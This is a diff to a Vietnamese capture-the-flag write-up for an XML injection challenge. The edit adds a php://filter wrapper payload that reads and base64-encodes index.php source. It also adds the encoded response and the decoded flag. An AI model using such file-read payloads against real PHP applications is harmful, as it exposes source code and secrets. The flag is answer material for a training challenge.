@@ -74,7 +74,7 @@
 You have logged in as user !!!
  ```
  - Vậy là thành công r , h chỉ việc dùng wrapper php://filter là móc tất tần tật source code ra !
- payload ``
+ payload `php://filter/zlib.deflate/convert.base64-encode/resource=index.php`
  và 
  ```
  <?xml version="1.0" encoding="UTF-8"?> 
@@ -92,6 +92,6 @@ You have logged in as user !!!
 <pass></pass>
 </creds>
  ```
- respont : XZBBTwIxEIXv/ophY7I1gYAHLyIYyHIwLnCQg56asjuUxm7btLsKUf+703U3IfbSTt+br9P38OiODq6AFnpvPfforK+VkWzFF3l+M201ZRQPWLO0VMFpceatOaRDuP3v0FZ2Kq/EiWs05LqbTMjXGrXanyrNCST2GjmaWtVnrq0o0QM7CB2wQ16T76A0wgzixiXWvLCmppbAUpr7fjxWxjV12jeUtiKzwU/ItuvMFk1FXnahjubxodd1znr4EPKnJV3wzXa12cF3X2a7LN8usr638FgGYgdVOY3xA3SgoDhBWST3xibQN2Zdw2gey05xIoQLJZZ/ChZHC8mbbeAoPhAoQIklBQoiQIsbDAZJBzloIQmSLp9fsPiKg6rAk9WJQgmK8lwL/964XBjZCInJTzq9+gU= . 
+ respont : ```XZBBTwIxEIXv/ophY7I1gYAHLyIYyHIwLnCQg56asjuUxm7btLsKUf+703U3IfbSTt+br9P38OiODq6AFnpvPfforK+VkWzFF3l+M201ZRQPWLO0VMFpceatOaRDuP3v0FZ2Kq/EiWs05LqbTMjXGrXanyrNCST2GjmaWtVnrq0o0QM7CB2wQ16T76A0wgzixiXWvLCmppbAUpr7fjxWxjV12jeUtiKzwU/ItuvMFk1FXnahjubxodd1znr4EPKnJV3wzXa12cF3X2a7LN8usr638FgGYgdVOY3xA3SgoDhBWST3xibQN2Zdw2gey05xIoQLJZZ/ChZHC8mbbeAoPhAoQIklBQoiQIsbDAZJBzloIQmSLp9fsPiKg6rAk9WJQgmK8lwL/964XBjZCInJTzq9+gU= ```. 
  Chỉ việc decode là ra flag :BKSec{XML_is_"ExtensibleMarkupLanguage"}
  tool: https://www.samltool.com/decode.php
